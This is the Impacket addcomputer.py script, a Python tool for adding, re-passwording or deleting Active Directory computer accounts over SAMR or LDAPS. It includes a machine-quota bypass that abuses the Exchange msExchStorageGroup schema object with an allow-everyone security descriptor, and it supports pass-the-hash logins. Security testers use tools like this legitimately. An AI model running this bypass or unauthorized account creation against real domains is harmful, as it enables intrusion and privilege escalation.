#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   This script will add a computer account to the domain and set its password.
#   Allows to use SAMR over SMB (this way is used by modern Windows computer when
#   adding machines through the GUI) and LDAPS.
#   Plain LDAP is not supported, as it doesn't allow setting the password.
#
# Author:
#   JaGoTu (@jagotu)
#
# Reference for:
#   SMB, SAMR, LDAP
#
# ToDo:
#   [ ]: Complete the process of joining a client computer to a domain via the SAMR protocol
#

from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_identity
from impacket.dcerpc.v5 import samr, epm, transport
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
from ldap3.protocol.microsoft import security_descriptor_control
from ldap3.utils.conv import escape_filter_chars

from impacket.examples.utils import ldap3_kerberos_login

import ldap3
import argparse
import logging
import sys
import string
import random
import ssl
from binascii import unhexlify


class ADDCOMPUTER:
    def __init__(self, username, password, domain, cmdLineOptions):
        self.options = cmdLineOptions
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__hashes = cmdLineOptions.hashes
        self.__aesKey = cmdLineOptions.aesKey
        self.__doKerberos = cmdLineOptions.k
        self.__target = cmdLineOptions.dc_host
        self.__kdcHost = cmdLineOptions.dc_host
        self.__computerName = cmdLineOptions.computer_name
        self.__computerPassword = cmdLineOptions.computer_pass
        self.__method = cmdLineOptions.method
        self.__port = cmdLineOptions.port
        self.__domainNetbios = cmdLineOptions.domain_netbios
        self.__noAdd = cmdLineOptions.no_add
        self.__delete = cmdLineOptions.delete
        self.__targetIp = cmdLineOptions.dc_ip
        self.__baseDN = cmdLineOptions.baseDN
        self.__computerGroup = cmdLineOptions.computer_group

        lmhash, nthash = self.__hashes.split(':') if self.__hashes is not None else ("", "")
        if lmhash == '' and len(nthash) == 32:
            self.__lmhash = 'aad3b435b51404eeaad3b435b51404ee'
            self.__hashes = ":".join([self.__lmhash, nthash])

        if self.__targetIp is not None:
            self.__kdcHost = self.__targetIp

        if self.__method not in ['SAMR', 'LDAPS']:
            raise ValueError("Unsupported method %s" % self.__method)

        if self.__doKerberos and cmdLineOptions.dc_host is None:
            raise ValueError("Kerberos auth requires DNS name of the target DC. Use -dc-host.")

        if self.__method == 'LDAPS' and not '.' in self.__domain:
                logging.warning('\'%s\' doesn\'t look like a FQDN. Generating baseDN will probably fail.' % self.__domain)

        if cmdLineOptions.hashes is not None:
            self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')

        if self.__computerName is None:
            if self.__noAdd:
                raise ValueError("You have to provide a computer name when using -no-add.")
            elif self.__delete:
                raise ValueError("You have to provide a computer name when using -delete.")
        else:
            if self.__computerName[-1] != '$':
                self.__computerName += '$'

        if self.__computerPassword is None:
            self.__computerPassword = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))

        if self.__target is None:
            if not '.' in self.__domain:
                logging.warning('No DC host set and \'%s\' doesn\'t look like a FQDN. DNS resolution of short names will probably fail.' % self.__domain)
            self.__target = self.__domain

        if self.__port is None:
            if self.__method == 'SAMR':
                self.__port = 445
            elif self.__method == 'LDAPS':
                self.__port = 636

        if self.__domainNetbios is None:
            self.__domainNetbios = self.__domain

        if self.__method == 'LDAPS' and self.__baseDN is None:
             # Create the baseDN
            domainParts = self.__domain.split('.')
            self.__baseDN = ''
            for i in domainParts:
                self.__baseDN += 'dc=%s,' % i
            # Remove last ','
            self.__baseDN = self.__baseDN[:-1]

        if self.__method == 'LDAPS' and self.__computerGroup is None:
            self.__computerGroup = 'CN=Computers,' + self.__baseDN



    def run_samr(self):
        if self.__targetIp is not None:
            stringBinding = epm.hept_map(self.__targetIp, samr.MSRPC_UUID_SAMR, protocol = 'ncacn_np')
        else:
            stringBinding = epm.hept_map(self.__target, samr.MSRPC_UUID_SAMR, protocol = 'ncacn_np')
        rpctransport = transport.DCERPCTransportFactory(stringBinding)
        rpctransport.set_dport(self.__port)

        if self.__targetIp is not None:
            rpctransport.setRemoteHost(self.__targetIp)
            rpctransport.setRemoteName(self.__target)

        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash,
                                         self.__nthash, self.__aesKey)

        rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
        self.doSAMRAdd(rpctransport)

    def getUserInfo(self, ldapConn, username):
        ldapConn.search(self.__baseDN, '(sAMAccountName=%s)' % escape_filter_chars(username), attributes=['objectSid'])
        try:
            dn = ldapConn.entries[0].entry_dn
            sid = ldapConn.entries[0]['objectSid']
            return (dn, sid)
        except IndexError:
            logging.error('User not found in LDAP: %s' % username)
            return False

    def bypass_with_msExchStorageGroup(self, ldapConn, ucd):
        logging.info('Checking if `msExchStorageGroup` object exists within the schema and is vulnerable')
        res = ldapConn.search(ldapConn.server.info.other['schemaNamingContext'][0], '(cn=ms-Exch-Storage-Group)',
            search_scope=ldap3.LEVEL, attributes=['possSuperiors'])
        
        if not res:
            logging.error('Object `msExchStorageGroup` does not exist within the schema, Exchange is probably not installed')
            return False
        
        if 'computer' not in ldapConn.response[0]['attributes']['possSuperiors']:
            logging.error('Object `msExchStorageGroup` not vulnerable, was probably patched')
            return False

        logging.info('Object `msExchStorageGroup` exists and is vulnerable!')

        result = self.getUserInfo(ldapConn, self.__username)
        if not result:
            logging.error("Could not find target user in domain.")
            return False

        ACL_ALLOW_EVERYONE_EVERYTHING = b'\x01\x00\x04\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x000\x00\x02\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\n\x14\x00\x00\x00\x00\x10\x01\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00'
        target_dn = result[0]
        mESG_name = ''.join(random.choice(string.ascii_uppercase) for _ in range(8))
        mESG_dn = ('CN=%s,%s' % (mESG_name, target_dn))

        logging.info('Attempting to add new `msExchStorageGroup` object `%s` under `%s`' % (mESG_name, target_dn))
        res = ldapConn.add(mESG_dn, ['top', 'container', 'msExchStorageGroup'],
            {'nTSecurityDescriptor': ACL_ALLOW_EVERYONE_EVERYTHING}, controls=security_descriptor_control(sdflags=0x04))

        if not res:
            logging.error('Failed to add `msExchStorageGroup` object: %s' % str(ldapConn.result))
            return False

        logging.info('Added `msExchStorageGroup` object at `%s`. DON\'T FORGET TO CLEANUP' % mESG_dn)

        computerHostname = self.__computerName[:-1]

        newComputerDn = 'CN=%s,%s' % (computerHostname, mESG_dn)
        logging.info('Attempting to create computer in `%s`', mESG_dn)
        res = ldapConn.add(newComputerDn, ['top','person','organizationalPerson','user','computer'], ucd)

        if not res:
            logging.error('Failed to add a new computer: %s' % str(ldapConn.result))
            return False

        logging.info('Adding new computer with username: %s and password: %s result: OK' % (self.__computerName, self.__computerPassword))

    def run_ldaps(self):
        connectTo = self.__target
        if self.__targetIp is not None:
            connectTo = self.__targetIp
        try:
            user = '%s\\%s' % (self.__domain, self.__username)
            tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2, ciphers='ALL:@SECLEVEL=0')
            try:
                ldapServer = ldap3.Server(connectTo, use_ssl=True, port=self.__port, get_info=ldap3.ALL, tls=tls)
                if self.__doKerberos:
                    ldapConn = ldap3.Connection(ldapServer)
                    ldap3_kerberos_login(ldapConn, connectTo, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                                 self.__aesKey, kdcHost=self.__kdcHost)
                elif self.__hashes is not None:
                    ldapConn = ldap3.Connection(ldapServer, user=user, password=self.__hashes, authentication=ldap3.NTLM)
                    ldapConn.bind()
                else:
                    ldapConn = ldap3.Connection(ldapServer, user=user, password=self.__password, authentication=ldap3.NTLM)
                    ldapConn.bind()

            except ldap3.core.exceptions.LDAPSocketOpenError:
                #try tlsv1
                tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1, ciphers='ALL:@SECLEVEL=0')
                ldapServer = ldap3.Server(connectTo, use_ssl=True, port=self.__port, get_info=ldap3.ALL, tls=tls)
                if self.__doKerberos:
                    ldapConn = ldap3.Connection(ldapServer)
                    ldap3_kerberos_login(ldapConn, connectTo, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                                 self.__aesKey, kdcHost=self.__kdcHost)
                elif self.__hashes is not None:
                    ldapConn = ldap3.Connection(ldapServer, user=user, password=self.__hashes, authentication=ldap3.NTLM)
                    bind_res = ldapConn.bind()
                    if not bind_res:
                        raise Exception(ldapConn.result)
                else:
                    ldapConn = ldap3.Connection(ldapServer, user=user, password=self.__password, authentication=ldap3.NTLM)
                    ldapConn.bind()



            if self.__noAdd or self.__delete:
                if not self.LDAPComputerExists(ldapConn, self.__computerName):
                    raise Exception("Account %s not found in %s!" % (self.__computerName, self.__baseDN))

                computer = self.LDAPGetComputer(ldapConn, self.__computerName)

                if self.__delete:
                    res = ldapConn.delete(computer.entry_dn)
                    message = "delete"
                else:
                    res = ldapConn.modify(computer.entry_dn, {'unicodePwd': [(ldap3.MODIFY_REPLACE, ['"{}"'.format(self.__computerPassword).encode('utf-16-le')])]})
                    message = "set password for"


                if not res:
                    if ldapConn.result['result'] == ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS:
                        raise Exception("User %s doesn't have right to %s %s!" % (self.__username, message, self.__computerName))
                    else:
                        raise Exception(str(ldapConn.result))
                else:
                    if self.__noAdd:
                        logging.info("Succesfully set password of %s to %s." % (self.__computerName, self.__computerPassword))
                    else:
                        logging.info("Succesfully deleted %s." % self.__computerName)

            else:
                if self.__computerName is not None:
                    if self.LDAPComputerExists(ldapConn, self.__computerName):
                        raise Exception("Account %s already exists! If you just want to set a password, use -no-add." % self.__computerName)
                else:
                    while True:
                        self.__computerName = self.generateComputerName()
                        if not self.LDAPComputerExists(ldapConn, self.__computerName):
                            break


                computerHostname = self.__computerName[:-1]
                computerDn = ('CN=%s,%s' % (computerHostname, self.__computerGroup))

                # Default computer SPNs
                spns = [
                    'HOST/%s' % computerHostname,
                    'HOST/%s.%s' % (computerHostname, self.__domain),
                    'RestrictedKrbHost/%s' % computerHostname,
                    'RestrictedKrbHost/%s.%s' % (computerHostname, self.__domain),
                ]
                ucd = {
                    'dnsHostName': '%s.%s' % (computerHostname, self.__domain),
                    'userAccountControl': 0x1000,
                    'servicePrincipalName': spns,
                    'sAMAccountName': self.__computerName,
                    'unicodePwd': ('"%s"' % self.__computerPassword).encode('utf-16-le')
                }

                res = ldapConn.add(computerDn, ['top','person','organizationalPerson','user','computer'], ucd)
                if not res:
                    if ldapConn.result['result'] == ldap3.core.results.RESULT_UNWILLING_TO_PERFORM:
                        error_code = int(ldapConn.result['message'].split(':')[0].strip(), 16)
                        if error_code == 0x216D:
                            logging.critical("User %s machine quota exceeded!" % self.__username)
                            if self.__username.endswith('$'):
                                logging.info("Trying to bypass machine quota with `msExchStorageGroup` object")
                                self.bypass_with_msExchStorageGroup(ldapConn, ucd)
                        else:
                            raise Exception(str(ldapConn.result))
                    elif ldapConn.result['result'] == ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS:
                        raise Exception("User %s doesn't have right to create a machine account!" % self.__username)
                    else:
                        raise Exception(str(ldapConn.result))
                else:
                    logging.info("Successfully added machine account %s with password %s." % (self.__computerName, self.__computerPassword))
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()

            logging.critical(str(e))


    def LDAPComputerExists(self, connection, computerName):
        connection.search(self.__baseDN, '(sAMAccountName=%s)' % computerName)
        return len(connection.entries) ==1

    def LDAPGetComputer(self, connection, computerName):
        connection.search(self.__baseDN, '(sAMAccountName=%s)' % computerName)
        return connection.entries[0]

    def generateComputerName(self):
        return 'DESKTOP-' + (''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8)) + '$')

    def doSAMRAdd(self, rpctransport):
        dce = rpctransport.get_dce_rpc()
        servHandle = None
        domainHandle = None
        userHandle = None
        try:
            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)

            samrConnectResponse = samr.hSamrConnect5(dce, '\\\\%s\x00' % self.__target,
                samr.SAM_SERVER_ENUMERATE_DOMAINS | samr.SAM_SERVER_LOOKUP_DOMAIN )
            servHandle = samrConnectResponse['ServerHandle']

            samrEnumResponse = samr.hSamrEnumerateDomainsInSamServer(dce, servHandle)
            domains = samrEnumResponse['Buffer']['Buffer']
            domainsWithoutBuiltin = list(filter(lambda x : x['Name'].lower() != 'builtin', domains))

            if len(domainsWithoutBuiltin) > 1:
                domain = list(filter(lambda x : x['Name'].lower() == self.__domainNetbios, domains))
                if len(domain) != 1:
                    logging.critical("This server provides multiple domains and '%s' isn't one of them.", self.__domainNetbios)
                    logging.critical("Available domain(s):")
                    for domain in domains:
                        logging.error(" * %s" % domain['Name'])
                    logging.critical("Consider using -domain-netbios argument to specify which one you meant.")
                    raise Exception()
                else:
                    selectedDomain = domain[0]['Name']
            else:
                selectedDomain = domainsWithoutBuiltin[0]['Name']

            samrLookupDomainResponse = samr.hSamrLookupDomainInSamServer(dce, servHandle, selectedDomain)
            domainSID = samrLookupDomainResponse['DomainId']

            if logging.getLogger().level == logging.DEBUG:
                logging.info("Opening domain %s..." % selectedDomain)
            samrOpenDomainResponse = samr.hSamrOpenDomain(dce, servHandle, samr.DOMAIN_LOOKUP | samr.DOMAIN_CREATE_USER , domainSID)
            domainHandle = samrOpenDomainResponse['DomainHandle']


            if self.__noAdd or self.__delete:
                try:
                    checkForUser = samr.hSamrLookupNamesInDomain(dce, domainHandle, [self.__computerName])
                except samr.DCERPCSessionError as e:
                    if e.error_code == 0xc0000073:
                        raise Exception("Account %s not found in domain %s!" % (self.__computerName, selectedDomain))
                    else:
                        raise

                userRID = checkForUser['RelativeIds']['Element'][0]
                if self.__delete:
                    access = samr.DELETE
                    message = "delete"
                else:
                    access = samr.USER_FORCE_PASSWORD_CHANGE
                    message = "set password for"
                try:
                    openUser = samr.hSamrOpenUser(dce, domainHandle, access, userRID)
                    userHandle = openUser['UserHandle']
                except samr.DCERPCSessionError as e:
                    if e.error_code == 0xc0000022:
                        raise Exception("User %s doesn't have right to %s %s!" % (self.__username, message, self.__computerName))
                    else:
                        raise
            else:
                if self.__computerName is not None:
                    try:
                        checkForUser = samr.hSamrLookupNamesInDomain(dce, domainHandle, [self.__computerName])
                        raise Exception("Account %s already exists! If you just want to set a password, use -no-add." % self.__computerName)
                    except samr.DCERPCSessionError as e:
                        if e.error_code != 0xc0000073:
                            raise
                else:
                    foundUnused = False
                    while not foundUnused:
                        self.__computerName = self.generateComputerName()
                        try:
                            checkForUser = samr.hSamrLookupNamesInDomain(dce, domainHandle, [self.__computerName])
                        except samr.DCERPCSessionError as e:
                            if e.error_code == 0xc0000073:
                                foundUnused = True
                            else:
                                raise

                createUser = samr.hSamrCreateUser2InDomain(dce, domainHandle, self.__computerName, samr.USER_WORKSTATION_TRUST_ACCOUNT, samr.USER_FORCE_PASSWORD_CHANGE,)
                userHandle = createUser['UserHandle']

            if self.__delete:
                samr.hSamrDeleteUser(dce, userHandle)
                logging.info("Successfully deleted %s." % self.__computerName)
                userHandle = None
            else:
                samr.hSamrSetPasswordInternal4New(dce, userHandle, self.__computerPassword)
                if self.__noAdd:
                    logging.info("Successfully set password of %s to %s." % (self.__computerName, self.__computerPassword))
                else:
                    checkForUser = samr.hSamrLookupNamesInDomain(dce, domainHandle, [self.__computerName])
                    userRID = checkForUser['RelativeIds']['Element'][0]
                    openUser = samr.hSamrOpenUser(dce, domainHandle, samr.MAXIMUM_ALLOWED, userRID)
                    userHandle = openUser['UserHandle']
                    req = samr.SAMPR_USER_INFO_BUFFER()
                    req['tag'] = samr.USER_INFORMATION_CLASS.UserControlInformation
                    req['Control']['UserAccountControl'] = samr.USER_WORKSTATION_TRUST_ACCOUNT
                    samr.hSamrSetInformationUser2(dce, userHandle, req)
                    logging.info("Successfully added machine account %s with password %s." % (self.__computerName, self.__computerPassword))

        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()

            logging.critical(str(e))
        finally:
            if userHandle is not None:
                samr.hSamrCloseHandle(dce, userHandle)
            if domainHandle is not None:
                samr.hSamrCloseHandle(dce, domainHandle)
            if servHandle is not None:
                samr.hSamrCloseHandle(dce, servHandle)
            dce.disconnect()

    def run(self):
        if self.__method == 'SAMR':
            self.run_samr()
        elif self.__method == 'LDAPS':
            self.run_ldaps()

# Process command-line arguments.
if __name__ == '__main__':
    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help = True, description = "Adds a computer account to domain")

    if sys.version_info.major == 2 and sys.version_info.minor == 7 and sys.version_info.micro < 16: #workaround for https://bugs.python.org/issue11874
        parser.add_argument('account', action='store', help='[domain/]username[:password] Account used to authenticate to DC.')
    else:
        parser.add_argument('account', action='store', metavar='[domain/]username[:password]', help='Account used to authenticate to DC.')
    parser.add_argument('-domain-netbios', action='store', metavar='NETBIOSNAME', help='Domain NetBIOS name. Required if the DC has multiple domains.')
    parser.add_argument('-computer-name', action='store', metavar='COMPUTER-NAME$', help='Name of computer to add.'
                                                                                 'If omitted, a random DESKTOP-[A-Z0-9]{8} will be used.')
    parser.add_argument('-computer-pass', action='store', metavar='password', help='Password to set to computer'
                                                                                 'If omitted, a random [A-Za-z0-9]{32} will be used.')
    parser.add_argument('-no-add', action='store_true', help='Don\'t add a computer, only set password on existing one.')
    parser.add_argument('-delete', action='store_true', help='Delete an existing computer.')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-method', choices=['SAMR', 'LDAPS'], default='SAMR', help='Method of adding the computer.'
                                                                                'SAMR works over SMB.'
                                                                                'LDAPS has some certificate requirements'
                                                                                'and isn\'t always available.')


    parser.add_argument('-port', type=int, choices=[139, 445, 636],
                       help='Destination port to connect to. SAMR defaults to 445, LDAPS to 636.')

    group = parser.add_argument_group('LDAP')
    group.add_argument('-baseDN', action='store', metavar='DC=test,DC=local', help='Set baseDN for LDAP.'
                                                                                    'If ommited, the domain part (FQDN) '
                                                                                    'specified in the account parameter will be used.')
    group.add_argument('-computer-group', action='store', metavar='CN=Computers,DC=test,DC=local', help='Group to which the account will be added.'
                                                                                                        'If omitted, CN=Computers will be used,')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                       '(KRB5CCNAME) based on account parameters. If valid credentials '
                                                       'cannot be found, it will use the ones specified in the command '
                                                       'line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')
    group.add_argument('-dc-host', action='store',metavar = "hostname",  help='Hostname of the domain controller to use. '
                                                                              'If ommited, the domain part (FQDN) '
                                                                              'specified in the account parameter will be used')
    group.add_argument('-dc-ip', action='store',metavar = "ip",  help='IP of the domain controller to use. '
                                                                      'Useful if you can\'t translate the FQDN.'
                                                                      'specified in the account parameter will be used')


    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    logger.init(options.ts, options.debug)
    
    domain, username, password, _, _, options.k = parse_identity(options.account, options.hashes, options.no_pass, options.aesKey, options.k)

    if domain == '':
        logging.critical('Domain should be specified!')
        sys.exit(1)

    try:
        executer = ADDCOMPUTER(username, password, domain, options)
        executer.run()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        print(str(e))
